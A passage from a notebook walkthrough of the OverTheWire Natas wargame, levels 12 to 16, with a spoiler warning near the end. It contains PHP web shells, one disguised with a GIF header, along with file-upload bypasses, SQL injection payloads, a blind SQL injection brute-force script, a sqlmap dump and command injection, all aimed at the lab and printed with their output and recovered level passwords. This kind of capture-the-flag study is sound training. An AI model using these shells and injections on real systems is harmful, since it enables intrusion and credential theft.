    "?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Web Shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```php\n",
    "// passwd12_shell.php\n",
    "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Multipart formpost"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s \\\n",
    "-F filename=shell.php \\\n",
    "-F uploadedfile=@passwd12_shell.php 12\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas12</h1>\n",
    "<div id=\"content\">\n",
    "The file <a href=\"upload/jqayf65vdh.php\">upload/jqayf65vdh.php</a> has been uploaded<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh \\\n",
    "-r upload/jqayf65vdh.php \\\n",
    "-p e\\=cat%20/etc/natas_webpass/natas13 12\n",
    "```\n",
    "```\n",
    "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas13 - web shell w/ magic number"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 13\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas13</h1>\n",
    "<div id=\"content\">\n",
    "For security reasons, we now only accept image files!<br/><br/>\n",
    "\n",
    "\n",
    "<form enctype=\"multipart/form-data\" action=\"index.php\" method=\"POST\">\n",
    "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000\" />\n",
    "<input type=\"hidden\" name=\"filename\" value=\"zny2mqpp80.jpg\" />\n",
    "Choose a JPEG to upload (max 1KB):<br/>\n",
    "<input name=\"uploadedfile\" type=\"file\" />\n",
    "\n",
    "<input type=\"submit\" value=\"Upload File\" />\n",
    "</form>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 13\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas13</h1>\n",
    "<div id=\"content\">\n",
    "For security reasons, we now only accept image files!<br/><br/>\n",
    "\n",
    "<?php\n",
    "\n",
    "function genRandomString() {\n",
    "    $length = 10;\n",
    "    $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\";\n",
    "    $string = \"\";\n",
    "\n",
    "    for ($p = 0; $p < $length; $p++) {\n",
    "        $string .= $characters[mt_rand(0, strlen($characters)-1)];\n",
    "    }\n",
    "\n",
    "    return $string;\n",
    "}\n",
    "\n",
    "function makeRandomPath($dir, $ext) {\n",
    "    do {\n",
    "    $path = $dir.\"/\".genRandomString().\".\".$ext;\n",
    "    } while(file_exists($path));\n",
    "    return $path;\n",
    "}\n",
    "\n",
    "function makeRandomPathFromFilename($dir, $fn) {\n",
    "    $ext = pathinfo($fn, PATHINFO_EXTENSION);\n",
    "    return makeRandomPath($dir, $ext);\n",
    "}\n",
    "\n",
    "if(array_key_exists(\"filename\", $_POST)) {\n",
    "    $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]);\n",
    "\n",
    "    $err=$_FILES['uploadedfile']['error'];\n",
    "    if($err){\n",
    "        if($err === 2){\n",
    "            echo \"The uploaded file exceeds MAX_FILE_SIZE\";\n",
    "        } else{\n",
    "            echo \"Something went wrong :/\";\n",
    "        }\n",
    "    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {\n",
    "        echo \"File is too big\";\n",
    "    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {\n",
    "        echo \"File is not an image\";\n",
    "    } else {\n",
    "        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {\n",
    "            echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\";\n",
    "        } else{\n",
    "            echo \"There was an error uploading the file, please try again!\";\n",
    "        }\n",
    "    }\n",
    "} else {\n",
    "?>\n",
    "\n",
    "<form enctype=\"multipart/form-data\" action=\"index.php\" method=\"POST\">\n",
    "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000\" />\n",
    "<input type=\"hidden\" name=\"filename\" value=\"<?php print genRandomString(); ?>.jpg\" />\n",
    "Choose a JPEG to upload (max 1KB):<br/>\n",
    "<input name=\"uploadedfile\" type=\"file\" />\n",
    "\n",
    "<input type=\"submit\" value=\"Upload File\" />\n",
    "</form>\n",
    "<?php } ?>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Web Shell w/ magic number"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```php\n",
    "// passwd13_shell.php\n",
    "GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "file passwd13_shell.php\n",
    "```\n",
    "```\n",
    "shell.php: GIF image data, version 87a, 16188 x 26736\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Multipart formpost"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s \\\n",
    "-F filename=shell.php -F uploadedfile=@passwd13_shell.php 13\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas13</h1>\n",
    "<div id=\"content\">\n",
    "For security reasons, we now only accept image files!<br/><br/>\n",
    "\n",
    "The file <a href=\"upload/wedvn5nqi8.php\">upload/wedvn5nqi8.php</a> has been uploaded<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh \\\n",
    "-r upload/wedvn5nqi8.php \\\n",
    "-p e\\=cat%20/etc/natas_webpass/natas14 13 \\\n",
    "| cut -c7-\n",
    "```\n",
    "```\n",
    "qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas14 - SQL injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 14\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas14</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<form action=\"index.php\" method=\"POST\">\n",
    "Username: <input name=\"username\"><br>\n",
    "Password: <input name=\"password\"><br>\n",
    "<input type=\"submit\" value=\"Login\" />\n",
    "</form>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 14\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas14</h1>\n",
    "<div id=\"content\">\n",
    "<?php\n",
    "if(array_key_exists(\"username\", $_REQUEST)) {\n",
    "    $link = mysqli_connect('localhost', 'natas14', '<censored>');\n",
    "    mysqli_select_db($link, 'natas14');\n",
    "\n",
    "    $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\";\n",
    "    if(array_key_exists(\"debug\", $_GET)) {\n",
    "        echo \"Executing query: $query<br>\";\n",
    "    }\n",
    "\n",
    "    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {\n",
    "            echo \"Successful login! The password for natas15 is <censored><br>\";\n",
    "    } else {\n",
    "            echo \"Access denied!<br>\";\n",
    "    }\n",
    "    mysqli_close($link);\n",
    "} else {\n",
    "?>\n",
    "\n",
    "<form action=\"index.php\" method=\"POST\">\n",
    "Username: <input name=\"username\"><br>\n",
    "Password: <input name=\"password\"><br>\n",
    "<input type=\"submit\" value=\"Login\" />\n",
    "</form>\n",
    "<?php } ?>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### PHP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```php\n",
    "<?php\n",
    "\n",
    "if(array_key_exists(\"username\", $_REQUEST)) {\n",
    "  $link = mysqli_connect('localhost', 'natas14', '<censored>');\n",
    "  mysqli_select_db($link, 'natas14');\n",
    "\n",
    "  $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\" and password=\\\"\".$_REQUEST[\"password\"].\"\\\"\";\n",
    "  if (array_key_exists(\"debug\", $_GET)) {\n",
    "    echo \"Executing query: $query<br>\";\n",
    "  }\n",
    "\n",
    "  if (mysqli_num_rows(mysqli_query($link, $query)) > 0) {\n",
    "    echo \"Successful login! The password for natas15 is <censored><br>\";\n",
    "  } else {\n",
    "    echo \"Access denied!<br>\";\n",
    "  }\n",
    "\n",
    "  mysqli_close($link);\n",
    "} else {\n",
    "\n",
    "?>\n",
    "\n",
    "<?php\n",
    "\n",
    "}\n",
    "\n",
    "?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sp debug -d username='1\" OR \"1\"=\"1\"&password=\"1\" OR \"1\"=\"1' 14\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas14</h1>\n",
    "<div id=\"content\">\n",
    "Executing query: SELECT * from users where username=\"1\" OR \"1\"=\"1\"\" and password=\"\"1\" OR \"1\"=\"1\"<br>Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas15 - blind SQL injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 15\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas15</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<form action=\"index.php\" method=\"POST\">\n",
    "Username: <input name=\"username\"><br>\n",
    "<input type=\"submit\" value=\"Check existence\" />\n",
    "</form>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 15\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas15</h1>\n",
    "<div id=\"content\">\n",
    "<?php\n",
    "\n",
    "/*\n",
    "CREATE TABLE `users` (\n",
    "  `username` varchar(64) DEFAULT NULL,\n",
    "  `password` varchar(64) DEFAULT NULL\n",
    ");\n",
    "*/\n",
    "\n",
    "if(array_key_exists(\"username\", $_REQUEST)) {\n",
    "    $link = mysqli_connect('localhost', 'natas15', '<censored>');\n",
    "    mysqli_select_db($link, 'natas15');\n",
    "\n",
    "    $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\";\n",
    "    if(array_key_exists(\"debug\", $_GET)) {\n",
    "        echo \"Executing query: $query<br>\";\n",
    "    }\n",
    "\n",
    "    $res = mysqli_query($link, $query);\n",
    "    if($res) {\n",
    "    if(mysqli_num_rows($res) > 0) {\n",
    "        echo \"This user exists.<br>\";\n",
    "    } else {\n",
    "        echo \"This user doesn't exist.<br>\";\n",
    "    }\n",
    "    } else {\n",
    "        echo \"Error in query.<br>\";\n",
    "    }\n",
    "\n",
    "    mysqli_close($link);\n",
    "} else {\n",
    "?>\n",
    "\n",
    "<form action=\"index.php\" method=\"POST\">\n",
    "Username: <input name=\"username\"><br>\n",
    "<input type=\"submit\" value=\"Check existence\" />\n",
    "</form>\n",
    "<?php } ?>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### PHP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```php\n",
    "<?php\n",
    "\n",
    "/*\n",
    "CREATE TABLE `users` (\n",
    "  `username` varchar(64) DEFAULT NULL,\n",
    "  `password` varchar(64) DEFAULT NULL\n",
    ");\n",
    "*/\n",
    "\n",
    "if (array_key_exists(\"username\", $_REQUEST)) {\n",
    "\n",
    "  $link = mysqli_connect('localhost', 'natas15', '<censored>');\n",
    "  mysqli_select_db($link, 'natas15');\n",
    "\n",
    "  $query = \"SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\";\n",
    "  if (array_key_exists(\"debug\", $_GET)) {\n",
    "    echo \"Executing query: $query<br>\";\n",
    "  }\n",
    "\n",
    "  $res = mysqli_query($link, $query);\n",
    "  if ($res) {\n",
    "    if (mysqli_num_rows($res) > 0) {\n",
    "      echo \"This user exists.<br>\";\n",
    "    } else {\n",
    "      echo \"This user doesn't exist.<br>\";\n",
    "    }\n",
    "  } else {\n",
    "    echo \"Error in query.<br>\";\n",
    "  }\n",
    "\n",
    "  mysqli_close($link);\n",
    "  \n",
    "} else {\n",
    "\n",
    "?>\n",
    "\n",
    "<?php\n",
    "\n",
    "}\n",
    "\n",
    "?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### SQL Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "#!/usr/bin/env python\n",
    "\n",
    "from   bs4 import BeautifulSoup\n",
    "import re\n",
    "import requests\n",
    "import string\n",
    "\n",
    "url='http://natas15.natas.labs.overthewire.org/index.php?debug'\n",
    "with open(f'passwd15') as fn: passwd=fn.read().rstrip('\\n')\n",
    "\n",
    "filtered=''\n",
    "chars   =string.ascii_letters+string.digits\n",
    "for char in chars:\n",
    "  data={'username':'natas16\" and password like binary \"%'+char+'%'}\n",
    "  html=requests.post(url, auth=('natas15', passwd), data=data).text\n",
    "  if 'exists' in html:\n",
    "    filtered+=char\n",
    "    query=BeautifulSoup(html, 'html.parser').body.find(string=re.compile(\"Executing query\")).lstrip(\"\\nExecuting query: \")\n",
    "    print(f'{query}, password dictionary : {filtered}')\n",
    "\n",
    "#filtered='adfgijklqruADEHOPRTVZ23579'\n",
    "password=''\n",
    "for _ in range(32):\n",
    "  for char in filtered:\n",
    "    data={'username':f'natas16\" and password like binary \"'+password+char+'%'}\n",
    "    html=requests.post(url, auth=('natas15', passwd), data=data).text\n",
    "    if 'exists' in html:\n",
    "      password+=char\n",
    "      query=BeautifulSoup(html, 'html.parser').body.find(string=re.compile(\"Executing query\")).lstrip(\"\\nExecuting query: \")\n",
    "      print(f'{query}')\n",
    "      break\n",
    "```\n",
    "```sql\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%a%\", password dictionary : a\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%d%\", password dictionary : ad\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%f%\", password dictionary : adf\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%g%\", password dictionary : adfg\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%i%\", password dictionary : adfgi\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%j%\", password dictionary : adfgij\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%k%\", password dictionary : adfgijk\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%l%\", password dictionary : adfgijkl\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%q%\", password dictionary : adfgijklq\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%r%\", password dictionary : adfgijklqr\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%u%\", password dictionary : adfgijklqru\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%A%\", password dictionary : adfgijklqruA\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%D%\", password dictionary : adfgijklqruAD\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%E%\", password dictionary : adfgijklqruADE\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%H%\", password dictionary : adfgijklqruADEH\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%O%\", password dictionary : adfgijklqruADEHO\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%P%\", password dictionary : adfgijklqruADEHOP\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%R%\", password dictionary : adfgijklqruADEHOPR\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%T%\", password dictionary : adfgijklqruADEHOPRT\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%V%\", password dictionary : adfgijklqruADEHOPRTV\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%Z%\", password dictionary : adfgijklqruADEHOPRTVZ\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%2%\", password dictionary : adfgijklqruADEHOPRTVZ2\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%3%\", password dictionary : adfgijklqruADEHOPRTVZ23\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%5%\", password dictionary : adfgijklqruADEHOPRTVZ235\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%7%\", password dictionary : adfgijklqruADEHOPRTVZ2357\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"%9%\", password dictionary : adfgijklqruADEHOPRTVZ23579\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"T%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TR%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7i%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZ%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZr%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5g%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gA%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gAT%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATj%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9P%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9Pk%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkP%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPE%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEu%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEua%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaO%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOl%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlf%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfE%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEj%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEjH%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEjHq%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEjHqj%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEjHqj3%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEjHqj32%\"\n",
    "SELECT * from users where username=\"natas16\" and password like binary \"TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V%\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### sqlmap"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "LVL=15\n",
    "sqlmap -u \"http://natas$LVL.natas.labs.overthewire.org\" \\\n",
    "--auth-type Basic --auth-cred \"natas$LVL:$(cat \"passwd$LVL\")\" \\\n",
    "--method POST --data 'username=natas16' \\\n",
    "--dbms mysql -b -D \"natas$LVL\" -T users -C username,password \\\n",
    "--string exists --level 5 --technique B \\\n",
    "--dump --batch --threads 4\n",
    "```\n",
    "```\n",
    "        ___\n",
    "       __H__\n",
    " ___ ___[.]_____ ___ ___  {1.7.12#stable}\n",
    "|_ -| . [']     | .'| . |\n",
    "|___|_  [.]_|_|_|__,|  _|\n",
    "      |_|V...       |_|   https://sqlmap.org\n",
    "\n",
    "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n",
    "\n",
    "[*] starting @ 14:50:41 /2023-12-29/\n",
    "\n",
    "[14:50:41] [INFO] testing connection to the target URL\n",
    "[14:50:42] [INFO] testing if the provided string is within the target URL page content\n",
    "sqlmap resumed the following injection point(s) from stored session:\n",
    "---\n",
    "Parameter: username (POST)\n",
    "    Type: boolean-based blind\n",
    "    Title: AND boolean-based blind - WHERE or HAVING clause\n",
    "    Payload: username=natas16\" AND 5100=5100-- UhFt\n",
    "---\n",
    "[14:50:42] [INFO] testing MySQL\n",
    "[14:50:42] [INFO] confirming MySQL\n",
    "[14:50:42] [INFO] the back-end DBMS is MySQL\n",
    "[14:50:42] [INFO] fetching banner\n",
    "[14:50:42] [INFO] retrieving the length of query output\n",
    "[14:50:42] [INFO] retrieved: 23\n",
    "[14:50:45] [INFO] resuming partial value: 8\n",
    "[14:50:58] [INFO] retrieved: 8.0.34-0ubuntu0.22.04.1            \n",
    "web server operating system: Linux Ubuntu 22.04 (jammy)\n",
    "web application technology: Apache 2.4.52\n",
    "back-end DBMS operating system: Linux Ubuntu\n",
    "back-end DBMS: MySQL >= 8.0.0\n",
    "banner: '8.0.34-0ubuntu0.22.04.1'\n",
    "[14:50:58] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'natas15'\n",
    "[14:50:58] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'natas15'\n",
    "[14:50:58] [INFO] resumed: 4\n",
    "[14:50:58] [INFO] retrieving the length of query output\n",
    "[14:50:58] [INFO] retrieved: 10\n",
    "[14:51:01] [INFO] resumed: 6P151OntQe\n",
    "[14:51:01] [INFO] retrieving the length of query output\n",
    "[14:51:01] [INFO] retrieved: 3\n",
    "[14:51:02] [INFO] resumed: bob\n",
    "[14:51:02] [INFO] retrieving the length of query output\n",
    "[14:51:02] [INFO] retrieved: 10\n",
    "[14:51:05] [INFO] resumed: HLwuGKts2w\n",
    "[14:51:05] [INFO] retrieving the length of query output\n",
    "[14:51:05] [INFO] retrieved: 7\n",
    "[14:51:06] [INFO] resumed: charlie\n",
    "[14:51:06] [INFO] retrieving the length of query output\n",
    "[14:51:06] [INFO] retrieved: 10\n",
    "[14:51:09] [INFO] resumed: hROtsfM734\n",
    "[14:51:09] [INFO] retrieving the length of query output\n",
    "[14:51:09] [INFO] retrieved: 5\n",
    "[14:51:11] [INFO] resumed: alice\n",
    "[14:51:11] [INFO] retrieving the length of query output\n",
    "[14:51:11] [INFO] retrieved: 32\n",
    "[14:51:13] [INFO] resumed: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V\n",
    "[14:51:13] [INFO] retrieving the length of query output\n",
    "[14:51:13] [INFO] retrieved: 7\n",
    "[14:51:15] [INFO] resumed: natas16\n",
    "Database: natas15\n",
    "Table: users\n",
    "[4 entries]\n",
    "+----------+----------------------------------+\n",
    "| username | password                         |\n",
    "+----------+----------------------------------+\n",
    "| bob      | 6P151OntQe                       |\n",
    "| charlie  | HLwuGKts2w                       |\n",
    "| alice    | hROtsfM734                       |\n",
    "| natas16  | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |\n",
    "+----------+----------------------------------+\n",
    "\n",
    "[14:51:15] [INFO] table 'natas15.users' dumped to CSV file '~/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'\n",
    "[14:51:15] [INFO] fetched data logged to text files under '~/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'\n",
    "\n",
    "[*] ending @ 14:51:15 /2023-12-29/\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas16 - command injection via command substitution"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 16\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas16</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "For security reasons, we now filter even more on certain characters<br/><br/>\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 16\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas16</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "For security reasons, we now filter even more on certain characters<br/><br/>\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "<?\n",
    "$key = \"\";\n",
    "\n",
    "if(array_key_exists(\"needle\", $_REQUEST)) {\n",
    "    $key = $_REQUEST[\"needle\"];\n",
    "}\n",
    "\n",
    "if($key != \"\") {\n",
    "    if(preg_match('/[;|&amp;`\\'\"]/',$key)) {\n",
    "        print \"Input contains an illegal character!\";\n",
    "    } else {\n",
    "        passthru(\"grep -i \\\"$key\\\" dictionary.txt\");\n",
    "    }\n",
    "}\n",
    "?>\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sd needle='$(grep A /etc/natas_webpass/natas17)false' 16\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas16</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "For security reasons, we now filter even more on certain characters<br/><br/>\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "false\n",
    "falsehood\n",
    "falsehood's\n",
    "falsehoods\n",
    "falsely\n",
    "falser\n",
    "falsest\n",
    "falsetto\n",
    "falsetto's\n",
    "falsettos\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"color: red; font-size: 24px;\">\n",
    "SPOILERS! This page contains solutions. Proceed with caution.\n",
    "</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Resources"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://overthewire.org/wargames/) ] OverTheWire\n",
    "\n",
